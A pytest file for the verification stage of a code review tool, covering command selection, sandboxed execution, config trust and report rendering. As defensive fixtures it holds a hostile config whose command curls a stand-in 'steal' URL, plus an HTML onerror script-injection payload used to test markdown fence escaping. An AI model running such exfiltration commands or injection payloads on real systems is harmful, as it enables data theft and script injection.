"""The verification stage: what it selects, what it refuses, and what it records.

Selection is pure and is tested directly. Execution is tested against real
subprocesses rather than mocks -- the whole value of this stage is that a command
actually ran, so a test that stubs the running proves nothing about it.
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

from roborak.analysis.reviewer import Reviewer
from roborak.core.config import (
    Config,
    Execution,
    VerificationCommand,
    VerificationConfig,
    load_verification,
)
from roborak.core.models import (
    ChangedFile,
    ChangeSet,
    ReviewResult,
    VerificationReport,
    VerificationRun,
    VerificationScope,
    VerificationStatus,
)
from roborak.core.severity import Severity
from roborak.llm.prompt import build_review_prompt
from roborak.render import json_out, markdown, terminal
from roborak.verify.runner import (
    MAX_OUTPUT_CHARS,
    VerificationRunner,
    for_prompt,
    select,
)

PYTHON = sys.executable


def changeset(*paths: str, origin: str = "local") -> ChangeSet:
    return ChangeSet(
        files=[ChangedFile(path=path) for path in paths],
        origin=origin,  # type: ignore[arg-type]
        base_sha="a" * 40,
    )


def config(**overrides: object) -> VerificationConfig:
    defaults: dict[str, object] = {
        "commands": [
            VerificationCommand(paths=["src/context/**"], command=["true", "context"]),
            VerificationCommand(paths=["src/core/**"], command=["true", "core"]),
        ],
        "fallback": ["true", "all"],
        "broaden_paths": ["src/core/models.py", "pyproject.toml"],
    }
    return VerificationConfig.model_validate(defaults | overrides)


# --- selection ---------------------------------------------------------------


def test_the_narrowest_matching_command_is_chosen():
    runs = select(config(), changeset("src/context/diff.py"))
    assert [run.command for run in runs] == [["true", "context"]]
    assert runs[0].scope is VerificationScope.TARGETED


def test_every_matching_command_is_chosen_when_a_change_spans_modules():
    runs = select(config(), changeset("src/context/diff.py", "src/core/verdict.py"))
    assert [run.command for run in runs] == [["true", "context"], ["true", "core"]]


def test_one_command_behind_two_path_rules_runs_once():
    duplicated = config(
        commands=[
            VerificationCommand(paths=["src/a/**"], command=["true", "shared"]),
            VerificationCommand(paths=["src/b/**"], command=["true", "shared"]),
        ]
    )
    runs = select(duplicated, changeset("src/a/one.py", "src/b/two.py"))
    assert [run.command for run in runs] == [["true", "shared"]]


def test_a_shared_boundary_escalates_to_the_broad_check_alone():
    """A full suite contains every subset of itself; running both is one run wasted."""
    runs = select(config(), changeset("src/context/diff.py", "src/core/models.py"))
    assert [run.command for run in runs] == [["true", "all"]]
    assert runs[0].scope is VerificationScope.BROAD


def test_an_unmatched_change_falls_back_to_the_broad_check():
    runs = select(config(), changeset("docs/index.md"))
    assert [run.command for run in runs] == [["true", "all"]]
    assert runs[0].scope is VerificationScope.BROAD


def test_an_unmatched_change_selects_nothing_when_there_is_no_fallback():
    assert select(config(fallback=[]), changeset("docs/index.md")) == []


def test_selection_is_capped():
    many = config(
        commands=[
            VerificationCommand(paths=[f"src/m{i}/**"], command=["true", str(i)]) for i in range(6)
        ],
        max_commands=2,
    )
    runs = select(many, changeset(*[f"src/m{i}/x.py" for i in range(6)]))
    assert len(runs) == 2


def test_deleted_and_binary_files_do_not_select_a_command():
    only_removals = ChangeSet(
        files=[
            ChangedFile(path="src/context/diff.py", change_type="deleted"),
            ChangedFile(path="src/core/logo.png", is_binary=True),
        ]
    )
    assert select(config(fallback=[]), only_removals) == []


def test_patterns_may_omit_the_leading_globstar():
    matched = config(commands=[VerificationCommand(paths=["**/*.php"], command=["true"])])
    runs = select(matched, changeset("app/Http/Controller.php"))
    assert [run.command for run in runs] == [["true"]]


# --- execution ---------------------------------------------------------------


def runner(tmp_path: Path, cfg: VerificationConfig) -> VerificationRunner:
    return VerificationRunner(repo=tmp_path, config=cfg, source="base revision abc123")


def script(body: str) -> list[str]:
    return [PYTHON, "-c", body]


def test_a_passing_command_is_recorded_with_its_exit_status(tmp_path: Path):
    cfg = config(commands=[], fallback=script("print('42 passed')"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    run = report.runs[0]
    assert run.status is VerificationStatus.PASSED
    assert run.exit_code == 0
    assert "42 passed" in run.output
    assert report.status is VerificationStatus.PASSED
    assert report.executed


def test_a_non_zero_exit_is_a_failure_and_keeps_its_output(tmp_path: Path):
    cfg = config(commands=[], fallback=script("print('1 failed'); raise SystemExit(1)"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    run = report.runs[0]
    assert run.status is VerificationStatus.FAILED
    assert run.exit_code == 1
    assert "1 failed" in run.output
    assert report.failing == [run]


def test_a_hanging_command_times_out_rather_than_hanging_the_review(tmp_path: Path):
    cfg = config(commands=[], fallback=script("import time; time.sleep(30)"), timeout_seconds=1)
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.TIMED_OUT
    assert "killed" in report.runs[0].note


def test_a_missing_executable_is_an_error_not_a_test_failure(tmp_path: Path):
    """Blaming an author for a runner this machine does not have is the wrong review."""
    cfg = config(commands=[], fallback=["roborak-no-such-binary", "--version"])
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.ERRORED
    assert report.runs[0].exit_code is None
    assert report.status is VerificationStatus.ERRORED


def test_output_is_bounded_to_its_tail(tmp_path: Path):
    cfg = config(
        commands=[],
        fallback=script("[print(f'line {i}') for i in range(500)]"),
        max_output_lines=5,
    )
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    run = report.runs[0]
    assert run.truncated
    assert run.output.splitlines() == [f"line {i}" for i in range(495, 500)]


def test_commands_never_see_the_callers_credentials(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "s3cret")
    cfg = config(commands=[], fallback=script("import os; print(os.environ.get('GITHUB_TOKEN'))"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].output.strip() == "None"


def test_a_remote_diff_is_never_verified(tmp_path: Path):
    """The checkout on disk is not the change under review, so running it proves nothing."""
    cfg = config(commands=[], fallback=script("print('ran')"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py", origin="github"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.SKIPPED
    assert "not checked out" in report.runs[0].note
    assert not report.executed


def test_ci_without_a_sandbox_refuses_to_run_anything(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("CI", "true")
    monkeypatch.setattr("roborak.verify.runner.sandbox_prefix", lambda repo: None)
    cfg = config(commands=[], fallback=script("print('ran')"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.SKIPPED
    assert "bubblewrap is unavailable" in report.runs[0].note


def test_trusted_execution_runs_directly_in_ci(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("CI", "true")
    monkeypatch.setattr("roborak.verify.runner.sandbox_prefix", lambda repo: None)
    cfg = config(commands=[], fallback=script("print('ran')"), execution=Execution.TRUSTED)
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.PASSED


def test_ci_prefixes_the_sandbox_when_one_is_available(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("CI", "true")
    monkeypatch.setattr("roborak.verify.runner.sandbox_prefix", lambda repo: [PYTHON, "-c", "pass"])
    cfg = config(commands=[], fallback=["ignored"])
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    assert report.runs[0].status is VerificationStatus.PASSED
    assert any("sandbox" in note for note in report.notes)


def test_nothing_configured_means_the_stage_never_ran(tmp_path: Path):
    empty = VerificationConfig()
    assert runner(tmp_path, empty).run(changeset("src/x.py")) is None


def test_disabling_the_stage_is_not_the_same_as_a_skip(tmp_path: Path):
    assert runner(tmp_path, config(enabled=False)).run(changeset("src/x.py")) is None
    assert runner(tmp_path, config(execution=Execution.OFF)).run(changeset("src/x.py")) is None


def test_a_configured_stage_that_matches_nothing_says_so(tmp_path: Path):
    cfg = config(fallback=[])
    report = runner(tmp_path, cfg).run(changeset("docs/index.md"))
    assert report is not None
    assert report.runs == []
    assert "No configured verification command matches" in report.notes[0]


# --- configuration -----------------------------------------------------------


def git(repo: Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    git(tmp_path, "init", "-q", "-b", "main")
    git(tmp_path, "config", "user.email", "t@e.com")
    git(tmp_path, "config", "user.name", "T")
    (tmp_path / "README.md").write_text("hello\n")
    git(tmp_path, "add", ".")
    git(tmp_path, "commit", "-qm", "first")
    return tmp_path


TRUSTED_YAML = """\
version: 1
verification:
  fallback: ["true", "trusted"]
"""

HOSTILE_YAML = """\
version: 1
verification:
  execution: trusted
  fallback: ["curl", "http://example.invalid/steal"]
"""


def test_commands_are_read_from_the_base_revision(repo: Path):
    (repo / ".roborak.yaml").write_text(TRUSTED_YAML)
    git(repo, "add", ".")
    git(repo, "commit", "-qm", "add config")
    config_, source, notes = load_verification(repo, ref="HEAD")
    assert config_.fallback == ["true", "trusted"]
    assert source.startswith("base revision")
    assert notes == []


def test_a_working_tree_cannot_define_the_command_that_verifies_it(repo: Path):
    """The whole trust model in one test: reviewing someone's branch must not run it."""
    (repo / ".roborak.yaml").write_text(TRUSTED_YAML)
    git(repo, "add", ".")
    git(repo, "commit", "-qm", "add config")
    (repo / ".roborak.yaml").write_text(HOSTILE_YAML)

    config_, _, notes = load_verification(repo, ref="HEAD")
    assert config_.fallback == ["true", "trusted"]
    assert config_.execution is Execution.AUTO
    assert any("working tree" in note for note in notes)


def test_an_explicit_config_path_is_trusted(repo: Path, tmp_path: Path):
    explicit = tmp_path / "trusted.yaml"
    explicit.write_text(TRUSTED_YAML)
    config_, source, _ = load_verification(repo, ref="HEAD", explicit_path=explicit)
    assert config_.fallback == ["true", "trusted"]
    assert source == str(explicit)


def test_uncommitted_work_is_verified_against_the_commit_behind_it(repo: Path):
    """The commonest local review: the edits under review are what HEAD does not have."""
    (repo / ".roborak.yaml").write_text(TRUSTED_YAML)
    git(repo, "add", ".")
    git(repo, "commit", "-qm", "add config")
    (repo / "src.py").write_text("uncommitted\n")

    config_, source, notes = load_verification(repo)
    assert config_.fallback == ["true", "trusted"]
    assert source == "base revision HEAD"
    assert notes == []


def test_a_directory_with_no_history_has_no_trusted_project_layer(tmp_path: Path):
    config_, source, notes = load_verification(tmp_path)
    assert config_.fallback == []
    assert source == "user and environment configuration"
    assert any("No project configuration could be read" in note for note in notes)


def test_a_caller_with_no_revision_at_all_reads_no_project_layer(tmp_path: Path):
    config_, _, notes = load_verification(tmp_path, ref="")
    assert config_.fallback == []
    assert any("no base revision" in note.lower() for note in notes)


def test_a_command_cannot_be_a_shell_string():
    with pytest.raises(ValueError):
        VerificationCommand(paths=["**/*.py"], command=[])
    with pytest.raises(ValueError):
        VerificationCommand(paths=["**/*.py"], command=["pytest", "  "])
    with pytest.raises(ValueError):
        VerificationCommand(paths=[], command=["pytest"])


# --- reporting ---------------------------------------------------------------


def report_with(status: VerificationStatus, **overrides: object) -> VerificationReport:
    defaults: dict[str, object] = {
        "name": "pytest tests/test_context.py",
        "command": ["pytest", "tests/test_context.py"],
        "status": status,
        "exit_code": 0 if status is VerificationStatus.PASSED else 1,
        "duration_ms": 1200,
    }
    if status is VerificationStatus.SKIPPED:
        defaults["exit_code"] = None
    return VerificationReport(
        runs=[VerificationRun.model_validate(defaults | overrides)],
        source="base revision abc123",
    )


def test_the_report_distinguishes_a_pass_from_a_skip():
    passed = markdown.render(ReviewResult(verification=report_with(VerificationStatus.PASSED)))
    skipped = markdown.render(ReviewResult(verification=report_with(VerificationStatus.SKIPPED)))
    assert "Verification — passed" in passed
    assert "Verification — not executed" in skipped


def test_a_static_only_review_makes_no_verification_claim():
    assert "Verification" not in markdown.render(ReviewResult())


def test_failing_output_cannot_close_the_fence_it_is_printed_in():
    """A test can print anything, including a fence, and a published comment renders it."""
    report = report_with(
        VerificationStatus.FAILED,
        output="E   assert False\n```\n<img src=x onerror=alert(1)>",
    )
    document = markdown.render(ReviewResult(verification=report))
    assert "````" in document
    assert "<img src=x onerror=alert(1)>" in document
    fences = [line for line in document.splitlines() if line.strip().startswith("````")]
    assert len(fences) == 2


def test_json_reports_verification_in_both_shapes():
    result = ReviewResult(verification=report_with(VerificationStatus.FAILED, output="boom"))
    full = json_out.to_dict(result)
    assert full["summary"]["verified"] is True
    assert full["verification"]["status"] == "failed"
    assert full["verification"]["runs"][0]["exit_code"] == 1

    agent = json_out.to_dict(result, agent=True)
    assert agent["verification"]["runs"][0]["output"] == "boom"
    assert agent["verification"]["runs"][0]["command"] == ["pytest", "tests/test_context.py"]


def test_json_says_unverified_when_nothing_ran():
    assert json_out.to_dict(ReviewResult())["summary"]["verified"] is False
    skipped = json_out.to_dict(ReviewResult(verification=report_with(VerificationStatus.SKIPPED)))
    assert skipped["summary"]["verified"] is False
    assert skipped["verification"]["status"] == "skipped"


def test_the_panel_view_states_the_verification_status(capsys):
    console = terminal.Console(force_terminal=False, width=100)
    terminal.render(
        ReviewResult(verification=report_with(VerificationStatus.FAILED)), console, Path(".")
    )
    assert "verification: failed" in capsys.readouterr().out


def test_a_green_run_is_not_pasted_into_the_prompt():
    """Passing output is a page of dots; the model needs the verdict, not the log."""
    payload = for_prompt(report_with(VerificationStatus.PASSED, output="....." * 20))
    assert payload is not None
    assert payload["runs"][0]["output"] == ""

    failed = for_prompt(report_with(VerificationStatus.FAILED, output="E   assert False"))
    assert failed is not None
    assert failed["runs"][0]["output"] == "E   assert False"


def test_the_verdict_says_it_is_not_speaking_for_the_tests():
    """ "Pass" printed above a red suite is a sentence a reader takes as covering both."""
    result = ReviewResult(verification=report_with(VerificationStatus.FAILED))
    result.block_on = Severity.CRITICAL
    document = markdown.render(result)
    assert "Pre-merge check: pass" in document
    assert "**Verification failed.** This verdict counts findings, not test results." in document


def test_a_passing_suite_adds_nothing_to_the_verdict():
    result = ReviewResult(verification=report_with(VerificationStatus.PASSED))
    result.block_on = Severity.CRITICAL
    assert "This verdict counts findings" not in markdown.render(result)


def test_a_run_that_could_not_start_explains_itself_in_the_report():
    report = report_with(
        VerificationStatus.ERRORED,
        exit_code=None,
        note="Could not run the command: No such file or directory: 'phpunit'",
    )
    document = markdown.render(ReviewResult(verification=report))
    assert "Could not run the command" in document
    assert "Verification — could not run" in document


def test_the_footer_states_verification_even_in_the_terminal_form():
    document = markdown.render(
        ReviewResult(verification=report_with(VerificationStatus.SKIPPED)),
        form=markdown.Form.TERMINAL,
    )
    assert "_verification: skipped · 1 check(s)_" in document


def test_a_run_that_never_started_is_not_an_execution_record():
    """`errored` is a statement about the machine, and nothing ran because of it."""
    report = report_with(VerificationStatus.ERRORED, exit_code=None, note="no such binary")
    assert not report.runs[0].executed
    assert not report.executed
    assert report.status is VerificationStatus.ERRORED
    assert json_out.to_dict(ReviewResult(verification=report))["summary"]["verified"] is False


def test_the_verdict_says_verification_could_not_complete():
    result = ReviewResult(verification=report_with(VerificationStatus.ERRORED, exit_code=None))
    result.block_on = Severity.CRITICAL
    assert "**Verification could not complete.**" in markdown.render(result)


def test_a_report_with_no_runs_still_reaches_the_prompt():
    """ "Nothing matched" and "never configured" are different facts, and only one is None."""
    assert for_prompt(None) is None

    empty = VerificationReport(
        notes=["No configured verification command matches the files this change touches."],
        source="base revision abc123",
    )
    payload = for_prompt(empty)
    assert payload is not None
    assert payload["status"] == "skipped"
    assert payload["executed"] is False
    assert payload["runs"] == []
    assert "No configured verification command matches" in payload["notes"][0]


def test_one_enormous_line_is_bounded_too(tmp_path: Path):
    """A line limit bounds a chatty runner; it does not bound a single line."""
    cfg = config(commands=[], fallback=script("print('x' * 200_000)"))
    report = runner(tmp_path, cfg).run(changeset("src/x.py"))
    assert report is not None
    run = report.runs[0]
    assert run.truncated
    assert len(run.output) == MAX_OUTPUT_CHARS


def test_the_prompt_does_not_claim_a_run_that_did_not_happen():
    """The section header alone would read as "the tests ran" whatever it then says."""
    skipped = build_review_prompt(
        changeset("src/x.py"),
        Config(),
        verification=report_with(VerificationStatus.SKIPPED, note="not checked out"),
    ).user
    assert "were **not run** against this change" in skipped
    assert "own checks were run against this change" not in skipped

    executed = build_review_prompt(
        changeset("src/x.py"), Config(), verification=report_with(VerificationStatus.FAILED)
    ).user
    assert "own checks were run against this change" in executed
    assert "**not run**" not in executed


def test_a_review_that_filtered_every_file_keeps_its_verification_record():
    """The stage already ran; dropping its report would read as never configured."""
    report = report_with(VerificationStatus.FAILED)
    result = Reviewer(
        config=Config(), repo=Path("/nonexistent"), llm=None, verification=report
    ).review(changeset("node_modules/vendor.js"))
    assert result.changeset is not None and result.changeset.is_empty
    assert result.verification is report
